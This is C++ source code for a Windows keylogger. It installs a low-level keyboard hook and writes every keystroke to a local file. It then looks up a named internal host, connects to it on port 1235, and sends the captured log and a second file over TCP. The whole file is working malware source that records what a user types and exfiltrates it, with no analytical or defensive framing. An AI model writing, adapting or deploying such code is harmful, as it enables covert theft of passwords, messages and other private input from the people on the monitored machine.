#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <filesystem>


using namespace std;

bool shift = false;

SOCKET socket_fd;

string SERVER_IP = "10.228.162.138";
const int SERVER_PORT = 1235; 

string findIp(string hostname) {
    FILE *o = popen(("ping -a " + hostname).c_str(), "r");
    // Sleep(10000);
    string ip = "";
    // format: >Pinging I-ACL-PF3TWBVD [10.228.161.97] with 32 bytes of data:
    char buf[100];
    fgets(buf, 100, o);
    if(buf[0] == 'P'){
        return "potato";
    }
    fgets(buf, 100, o);
    cout << buf;
    for (int a = 10 + hostname.size(); a < 100; a++) {
        if (buf[a] == ']')
            break;
        ip += buf[a];
    }
    pclose(o);
    return ip;
}

void sendfile(SOCKET s, const char fname[]){
    HANDLE hFile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    TransmitFile(s, hFile, 0, 0, NULL, NULL, 0);
}

void sendstring(SOCKET s, string k){
    send(s, k.c_str(), k.length(), 0);
}

string filesize(const char n[]){
    filesystem::path p = n;
    uintmax_t m =  filesystem::file_size(p);
    return to_string(m);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {
        
        
        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN){
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int h = p->vkCode;
            if (h == 160 || h == 161){
                shift = true;
                return(CallNextHookEx(NULL, nCode, wParam, lParam));
            }
            if (h >= 65 && h <= 90 && !shift) h += 32;
            char c = h;
            ofstream f;
            f.open("f.txt", ios::app);
            f << c;
            f.close();
            // // cout << shift << "\n";
            // cout << c << "\n";    
        }

        if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP){
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int h = p->vkCode;
            if (h == 160 || h == 161){
                shift = false;
            }
        }
    }
    return(CallNextHookEx(NULL, nCode, wParam, lParam));
}

void run(){
    
}

void send(SOCKET sock){
    string size = filesize("f.txt");
    string send = "'keylog\\f.txt'"+size+"b";
    sendstring(sock, send.c_str());
    sendfile(sock, "f.txt");
}

void sender(){
    if ((SERVER_IP = findIp("I-AET-PF4HB1GR")) == "potato") return;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "could not initialize winsock" << endl;
    }

    // Create socket
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        cout << "could not make socket" << endl;
        // WSACleanup();
    }

    // Set up server address
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
        cout << "invalid IP." << endl;
        // closesocket(socket_fd);
        // WSACleanup();
    }

    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "could not connect to server" << endl;
        // closesocket(socket_fd);
        // WSACleanup();
    }

    send(socket_fd);
    sendfile(socket_fd, "b.txt");



    
}

int main(){
    
    auto t = chrono::system_clock::now();
    // Connect to server
    // Install the low-level keyboard & mouse hooks
    HHOOK Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
    // Keep this app running until we're told to stop
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        if ((chrono::system_clock::now()-t).count() >= 5){
            sender();
        }
        t = chrono::system_clock::now();
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    closesocket(socket_fd);
    WSACleanup();

    UnhookWindowsHookEx(Kybd);
    return 0;
}
